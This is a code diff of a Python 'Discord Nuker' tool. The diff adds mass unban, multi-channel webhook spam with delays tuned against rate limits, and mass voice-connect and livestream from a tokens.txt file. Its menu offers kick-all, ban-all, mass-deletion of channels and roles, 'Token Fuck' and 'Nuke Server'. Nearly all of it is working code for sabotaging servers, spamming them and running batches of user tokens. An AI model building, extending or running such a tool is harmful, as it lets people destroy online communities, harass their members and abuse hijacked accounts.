+            if response.status_code in Status.SuccessStatus:
+                Status.Success(f"Unban {Member}")
+            
+            elif response.status_code in Status.RatelimitStatus:
+                Status.Ratelimit(f"Ratelimit")
+                time.sleep(0.05)
+                threading.Thread(target=Discord.Kick, args=(str(Member))).start()
+            
+            else:
+                Status.Fail(f"Unable to unban {Member}")
+        
         except:
             pass
 
@@ -783,7 +962,7 @@ class Discord:
         else:
             Status.Fail(f"TOKEN : {token} NOT LEAVE")
 
-    def Connect(token,VOICE_ID):
+    def Connect(Token,VOICE_ID):
         ws = websocket.WebSocket()
         ws.connect(URL.DiscordWebsocket)
         RECV = json.loads(ws.recv())
@@ -791,7 +970,7 @@ class Discord:
         ws.send(json.dumps({
                     "op":2,
                     "d": {
-                        "token":token, 
+                        "token":Token, 
                         "properties": {
                             "$os":"windows",
                             "$browser":"Discord",
@@ -812,6 +991,7 @@ class Discord:
                 }
             )
         )
+        Status.Success(f"{Token} Connected")
         while True:
             time.sleep(heartbeat_interval/1000)
             try:
@@ -869,6 +1049,7 @@ class Discord:
         }
     )
 )
+        Status.Success(f"{Token} Online")
         while True:
             time.sleep(heartbeat_interval/1000)
             try:
@@ -878,7 +1059,7 @@ class Discord:
             except Exception:
                 break
 
-    def Livestream(token, VOICE_ID):
+    def Livestream(Token, VOICE_ID):
         ws = websocket.WebSocket()
         ws.connect(URL.DiscordWebsocket)
         RECV = json.loads(ws.recv())
@@ -886,7 +1067,7 @@ class Discord:
         ws.send(json.dumps({
                     "op":2,
                     "d": {
-                        "token":token, 
+                        "token":Token, 
                         "properties": {
                             "$os":"windows",
                             "$browser":"Discord",
@@ -917,16 +1098,11 @@ class Discord:
                 }
             }
         )
-    )
-        while True:
-            time.sleep(heartbeat_interval/1000)
-            try:
-                ws.send(json.dumps({
-                    "op":1,
-                    "d":None}))
-            except Exception:
-                break
-    
+    )   
+
+        Status.Success(f"{Token} Livestream")
+        threading._start_new_thread(Function.SendHeartBeatInterval, (heartbeat_interval, ws))
+        
     def LanguageSpam():
         Languages = [
             ["bg","Bulgarian"],  
@@ -988,6 +1164,9 @@ class Discord:
 
 class ThreadFunction:
 
+    def Ban_ID():
+        print(Data.GetBanMember_ID())
+
     def Channel_ID():
         print(Data.GetChannel_ID())
     
@@ -996,172 +1175,217 @@ class ThreadFunction:
     
     def Role_ID():
         print(Data.GetRole_ID())
-    
+
+    def ThreadPinMessage():
+        Channel = input(f"{Constant.Space}{Colour.YELLOW}")
+        Message = Data.GetMessage_ID(Channel)
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            pass
+
     def ThreadThemeFlash():
-        threads_create = []
         func = [Discord.ThemeFlashingWhite,Discord.ThemeFlashingBlack]
         with ThreadPoolExecutor(max_workers=4) as executor:
             for i in range(4):
                 time.sleep(0.045)
-                threads_create.append(executor.submit(func[i]))
+                executor.submit(func[i])
     
     def ThreadSpamLanguage():
-        threads_create = []
         with ThreadPoolExecutor(max_workers=4) as executor:
             for i in range(4):
                 time.sleep(0.045)
-                threads_create.append(executor.submit(Discord.LanguageSpam))    
+                executor.submit(Discord.LanguageSpam)
 
     def ThreadTokenFuck():
-        threads_create = []
         func = [ThreadFunction.ThreadThemeFlash,Discord.LanguageSpam]
         with ThreadPoolExecutor(max_workers=2) as executor:
             for i in range(2):
                 time.sleep(0.045)
-                threads_create.append(executor.submit(func[i]))
+                executor.submit(func[i])
 
     def ThreadChangeChannelName():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
             Channels = Data.GetChannel_ID()
-            threads_create = [] 
             Name = input(f"{Constant.Space}{Colour.YELLOW}Channel Name : ")
             with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
                 for Channel in Channels:
-                    threads_create.append(executor.submit(Discord.ChangeChannelName,str(Channel),str(Name),))
+                    executor.submit(Discord.ChangeChannelName,str(Channel),str(Name),)
     
     def ThreadCreateRole():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
-            threads_create = [] 
             Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
             Name = input(f"{Constant.Space}{Colour.YELLOW}")
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateRole,str(Name),))
+                    executor.submit(Discord.CreateRole,str(Name),)
     
     def ThreadDeleteRole():
         if Constant.TOKEN is not False:
             Roles = Data.GetRole_ID()
-            threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Roles)) as executor:
                 for Role in Roles:
-                    threads_create.append(executor.submit(Discord.DeleteRole,str(Role),))
+                    executor.submit(Discord.DeleteRole,str(Role),)
 
     def ThreadCreateCategory():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
-            threads_create = [] 
             Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
             Name = input(f"{Constant.Space}{Colour.YELLOW}")
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateCategory,str(Name),))
+                    executor.submit(Discord.CreateCategory,str(Name),)
     
     def ThreadCreateVoice():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
-            threads_create = [] 
             Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
             Name = input(f"{Constant.Space}{Colour.YELLOW}")
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateVoiceChannel,str(Name),))
+                    executor.submit(Discord.CreateVoiceChannel,str(Name),)
             
     def ThreadCreateChannel():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
-            threads_create = [] 
             Num = int(input(f"{Constant.Space}{Colour.YELLOW}Number : "))
             Name = input(f"{Constant.Space}{Colour.YELLOW}Name : ")
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateChannel,Name,))
+                    executor.submit(Discord.CreateChannel,Name,)
             
     def ThreadDeleteChannel():
         if Constant.TOKEN is not False:
             Channels = Data.GetChannel_ID()
-            threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
-                for Channel in Channels:
-                    threads_create.append(executor.submit(Discord.DeleteChannel,str(Channel),))
+                for i in range(len(Channels)):
+                    time.sleep(0.045)
+                    executor.submit(Discord.DeleteChannel,Channels[i],)
 
     def ThreadSpamWebhook():
-        ChannelID = input(f"{Constant.Space}{Colour.YELLOW}Channel ID :")
-        response = requests.get(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader())
-        webhooks = []
-        if response.status_code in Status.SuccessStatus:
-            if len(response.json()) > 1:
-                for i in range(len(response.json())):
-                    print(response.json()[i])
-                    webhooks.append(f'{URL.WebhookBase}{response.json()[i]["id"]}/{response.json()[i]["token"]}')
-            while len(webhooks) < 10:
-                response = requests.post(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader(),
-                    json = {
-                        "name":"React"
-                    })
-                webhooks.append(f'{URL.WebhookBase}{response.json()["id"]}/{response.json()["token"]}')
-
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            ChannelID = Data.GetTextChannel_ID()
+            Message = input(f"{Constant.Space}{Colour.YELLOW}Message : ")
+            Loop = int(input(f"{Constant.Space}{Colour.YELLOW}Loop : "))
             Threads =[] 
-            Message = input(f"{Constant.Space}{Colour.YELLOW}>")
+            webhooks = []
+            if len(ChannelID) > 500:
+                ChannelID[:500]
+
+            for Channel in ChannelID:
+                response = requests.get(f"{URL.BaseURL}channels/{Channel}/webhooks",headers=ReqHeader.DiscordHeader())
+                webhooks_url = []
+                if response.status_code in Status.SuccessStatus:
+                    if len(response.json()) > 1:
+                        for i in range(len(response.json())):
+                            webhooks_url.append(f'{URL.WebhookBase}{response.json()[i]["id"]}/{response.json()[i]["token"]}')
+
+                    while len(webhooks_url) < 5:
+                        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks",headers=ReqHeader.DiscordHeader(),
+                            json = {
+                                "name":"React"
+                            })
+                        
+                        if response.status_code not in Status.SuccessStatus:
+                            break
+
+                        else:
+                            webhooks_url.append(f'{URL.WebhookBase}{response.json()["id"]}/{response.json()["token"]}')
+
+                    else:
+                        webhooks.append(webhooks_url)
+                        print(webhooks_url)
+                        continue
+                    break
 
             try:
+                if len(webhooks) < 5:
+                    delay = 0.55
                 
-                for i in range(int(input(f"{Constant.Space}{Colour.YELLOW}>"))):
-                    for webhook in webhooks:
-                        t = threading.Thread(target=Discord.SendWebhook, args=(webhook,Message,))
-                        Threads.append(t)
-                
-                for Thread in Threads:
-                    Thread.start()
-                    time.sleep(0.65)
+                else:
+                    if len(webhooks) > 5:
+                        delay = 0.45
+                    
+                    if len(webhooks) > 10:
+                        delay = 0.35
+                    
+                    if len(webhooks) > 15:
+                        delay = 0.30
+                    
+                    if len(webhooks) > 30:
+                        delay = 0.25
 
-                for Thread in Threads:
-                    Thread.join()
+                    if len(webhooks) > 50:
+                        delay = 0.20
+                    
+                    if len(webhooks) > 100:
+                        delay = 0.15
+                    
+                    if len(webhooks) > 150:
+                        delay = 0.10
+                    
+                    if len(webhooks) > 200:
+                        delay = 0.05
 
-            except ValueError:
-                print("Number of thread should only be an integer")
+                with ThreadPoolExecutor(max_workers=Loop*(len(webhooks)*10)) as executor:
+                    for i in range(int(Loop/3)):
+                        for Webhook_urls in webhooks:
+                            for Webhook_url in Webhook_urls:
+                                for i in range(6):
+                                    Threads.append(executor.submit(Discord.SendWebhook,Webhook_url,str(Message),))
+                                    time.sleep(delay)
+
+            except Exception as e:
+                print(e)
+        
+        else:
+            print(f"{Constant.Space}{Colour.YELLOW}")
 
     def ThreadKick():
-        if Constant.TOKEN is True and Constant.SERVER_ID is True:
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
             Members = Data.GetMember_ID()
-            threads_create = []
             with ThreadPoolExecutor(max_workers=len(Members)) as executor:
                 for Member in Members:
-                    threads_create.append(executor.submit(Discord.Kick,str(Member),))
+                    executor.submit(Discord.Kick,str(Member),)
 
         else:
-            print("")
+            print(f"{Constant.Space}")
 
     def ThreadBan():
-        if Constant.TOKEN is True and Constant.SERVER_ID is True:
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
             Members = Data.GetMember_ID()
-            threads_create = []
             with ThreadPoolExecutor(max_workers=len(Members)) as executor:
                 for Member in Members:
-                    threads_create.append(executor.submit(Discord.Ban,str(Member),))
+                    executor.submit(Discord.Ban,str(Member),)
         
+        else:
+            print(f"{Constant.Space}{Colour.YELLOW}")
+    
+    def ThreadUnban():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            Members = Data.GetBanMember_ID()
+            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
+                for Member in Members:
+                    executor.submit(Discord.Unban,str(Member),)
+
         else:
             print(f"{Constant.Space}")
 
     def ThreadLivestream():
         if Constant.SERVER_ID is not False:
-
             VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
-            threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Livestream,(token),str(VOICE_ID),))
-        
+                    executor.submit(Discord.Livestream,token,str(VOICE_ID),)
+
         else:
             print(f"{Constant.Space}")
     
     def ThreadConnect():
         if Constant.SERVER_ID is not False:
             VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
-            threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Connect,(token),str(VOICE_ID),))
+                    executor.submit(Discord.Connect,token,str(VOICE_ID),)
 
         else:
             print(f"{Constant.Space}")
@@ -1170,53 +1394,97 @@ class ThreadFunction:
         if Constant.SERVER_ID is not False:
             Type = int(input(f"{Constant.Space}{Colour.YELLOW}Type : "))
             Game = input(f"{Constant.Space}{Colour.YELLOW}Game : ")
-            threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Online,(token),(Type),(Game),))
+                    executor.submit(Discord.Online,token,Type,Game,)
         
         else:
             print(f"{Constant.Space}")
 
 class Main:
-
     FunctionDict = {
-        1: [ThreadFunction.Channel_ID,"Scrape Channels","Scrape Channels"], 
-        2: [ThreadFunction.Member_ID,"Scrape Members","Scrape Members"],
-        3: [ThreadFunction.Role_ID,"Scrape Roles","Scrape Roles"], 
-        4: [ThreadFunction.ThreadKick,"Kick","เเตะ"],
-        5: [ThreadFunction.ThreadBan,"Ban","เเบน"],
-        6: [Discord.Join,"Join","เข้าเซิฟ"],
-        7: [Discord.Leave,"Leave","ออกเซิฟ"], 
-        8: [Discord.CreateWebhook,"Create Webhook","สร้าง Webhook"],
-        9: [ThreadFunction.ThreadSpamWebhook,"Spam Webhook","สเเปม Webhook"],
-        10: [ThreadFunction.ThreadConnect,"Connect","เข้าห้องเสียง"], 
-        11: [ThreadFunction.ThreadOnline,"Online","ขึ้นสถานะ Online"],
-        12: [ThreadFunction.ThreadLivestream,"Livestream","ไลฟ์สตรีม"],
-        13: [ThreadFunction.ThreadCreateChannel,"Create Channels","สร้างห้องเเชท"],
-        14: [ThreadFunction.ThreadDeleteChannel,"Delete Channels","ลบห้อง"],
-        15: [ThreadFunction.ThreadChangeChannelName,"Channel Name","เเก้ชื่อห้อง"],
-        16: [ThreadFunction.ThreadCreateCategory,"Create Category","สร้างหมวดหมู่"],
-        17: [ThreadFunction.ThreadCreateVoice,"Create Voice","สร้างห้องเสียง"],
-        18: [ThreadFunction.ThreadCreateRole,"Create Role","สร้างยศ"],
-        19: [ThreadFunction.ThreadDeleteRole,"Delete Role","ลบยศ"],
-        20: [Discord.ChangeRoleName,"Change Role","เปลี่ยนชื่ยศ"],
-        21: ["","Change Nickname","Change Nickname"],
-        22: [Discord.ChangeServerName,"Server Name","Server Name"],
-        23: [Discord.ChangeServerImage,"Server Picture","Server Picture"],
-        24: ["","Spam Channel","Spam Channel"],
-        25: [ThreadFunction.ThreadSpamLanguage,"Language Spam",""],
-        26: [ThreadFunction.ThreadThemeFlash,"Theme Flash",""],
-        27: [Discord.CreateServer,"Server Spam",""],
-        28: [ThreadFunction.ThreadTokenFuck,"Token Fuck","Token Fuck"],
-        29: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
-        30: [Discord.DiscordTokenLogin,"Login Token","Login Token"],
-        31: ["","Nuke Server","Nuke Server"],
-        32: [Data.GetTokenInfo,"Token Info",""],
-        33: [Discord.CopyServer,"Copy Server",""],
-        34: [Data.GetUserInfoServer,"",""],
-        35: ["","",""],
-        36: [sys.exit,"Exit","ออก"]
+        1: [ThreadFunction.Channel_ID,"Scrape Channels",
+        "Scrape channels ID in the discord server"], 
+        2: [ThreadFunction.Member_ID,"Scrape Members",
+        "Scrape Members ID in the discord server"],
+        3: [ThreadFunction.Role_ID,"Scrape Roles",
+        "Scrape Roles ID in the discord server"], 
+        4: [ThreadFunction.Ban_ID,"Scrape Bans",
+        "Scrape Banned Members ID in the discord server"],
+        5: [ThreadFunction.ThreadKick,"Kick all",
+        "Kick every member in the discord server"],
+        6: [ThreadFunction.ThreadBan,"Ban all",
+        "Ban every member in the discord server"],
+        7: [ThreadFunction.ThreadUnban,"Unban all",
+        "Unban everyone in the discord server"],
+        8: [Discord.Kick,"Kick ID",
+        "Kick a member from their discord ID"],
+        9: [Discord.Ban,"Ban ID",
+        "Ban a member from their discord ID"],
+        10:[Discord.Unban,"Unban ID",
+        "Unban a member from their discord ID"],
+        11:[Discord.Join,"Mass Join",
+        "Mass join a server using tokens.txt"],
+        12:[Discord.Leave,"Mass Leave",
+        "Mass leave a server using tokens.txt"], 
+        13:[Discord.CreateWebhook,"Create Webhook",
+        "Create a webhook in a channel"],
+        14:[ThreadFunction.ThreadSpamWebhook,"Spam Webhook",
+        "Create and spamwebhook in every channels"],
+        15:[ThreadFunction.ThreadConnect,"Connect",
+        "Mass connect tokens from tokens.txt to voice channel"], 
+        16:[ThreadFunction.ThreadOnline,"Online",
+        "Mass online tokens from tokens.txt"],
+        17:[ThreadFunction.ThreadLivestream,"Livestream",
+        "Mass livestream tokens from tokens.txt"],    
+        18:[ThreadFunction.ThreadCreateChannel,"Create Channels",
+        "Spam create channel in discord server"],
+        19:[ThreadFunction.ThreadDeleteChannel,"Delete Channels",
+        "Spam delete channel in discord server"],
+        20:[ThreadFunction.ThreadChangeChannelName,"Channel Name",
+        "Spam edit channel name in discord server"],
+        21:[ThreadFunction.ThreadCreateCategory,"Create Category",
+        "Spam create category in discord server"],
+        22:[ThreadFunction.ThreadCreateVoice,"Create Voice",
+        "Spam create voice channel in discord server"],
+        23:[ThreadFunction.ThreadCreateRole,"Create Role",
+        "Spam create roles in discord server"],
+        24:[ThreadFunction.ThreadDeleteRole,"Delete Role",
+        "Spam delete roles in discord server"],
+        25:[Discord.ChangeRoleName,"Change Role",
+        "Spam edit role name in discord server"],
+        26:["","Change Nickname",
+        "Change Nickname"],
+        27:[Discord.ChangeServerName,"Server Name",
+        "Server Name"],
+        28:[Discord.ChangeServerImage,"Server Picture",
+        "Server Picture"],
+        29:["","Spam Channel",
+        "Spam Channel"],
+        30:[ThreadFunction.ThreadSpamLanguage,"Language Spam",
+        ""],
+        31:[ThreadFunction.ThreadThemeFlash,"Theme Flash",
+        ""],
+        32:[Discord.CreateServer,"Server Spam",
+        ""],
+        33:[ThreadFunction.ThreadTokenFuck,"Token Fuck",
+        "Token Fuck"],
+        34:[Discord.ChangeStatus,"Change Status",
+        "เปลี่ยนสถานะ"],
+        35:[Discord.DiscordTokenLogin,"Login Token",
+        "Login Token"],
+        36:["","Nuke Server",
+        "Nuke Server"],
+        37:[Data.GetTokenInfo,"Token Info",
+        ""],
+        38:[Discord.CopyServer,"Copy Server",
+        ""],
+        39:[Data.GetUserInfoServer,"",""],
+        40:["","",""],
+        41:["","",""],
+        42:["","",""],
+        43:["","Help","Show help"],
+        44:[sys.exit,"Exit","ออก"],
     }
 
     def run(Run =False):
@@ -1242,6 +1510,7 @@ class Main:
                     Main.FunctionDict[Choice][0]()
 
                     if input(f"{Constant.Space}{Colour.YELLOW}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
+                        ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Ready")
                         Main.run(Run=True)
                         break
                     
@@ -1249,6 +1518,7 @@ class Main:
                         Main.FunctionDict[36][0]()
 
                 except (ValueError, KeyError) as e:
+                    print(e)
                     Status.Fail("Invalid choice")
 
         else:
@@ -1256,17 +1526,17 @@ class Main:
             print(f"{Constant.Space}{Colour.RED}No Internet Connection")
 
 def start(START=False):
-    os.system("color 07")
     title = ''
-    for char in "Disocrd Nuker BY REACT#1120 | Loading...": 
+    for char in "Disocrd Nuker BY REACT#1120": 
         title = title + char
         time.sleep(0.018)
         ctypes.windll.kernel32.SetConsoleTitleW(f'{title}')
+    os.system("color 07")
 
     if START is True:
         Function.Spinner()
+        ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Loading...")
         try:
-            ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Loading...")
             Main.run()
         except Exception as e:
             print(e)
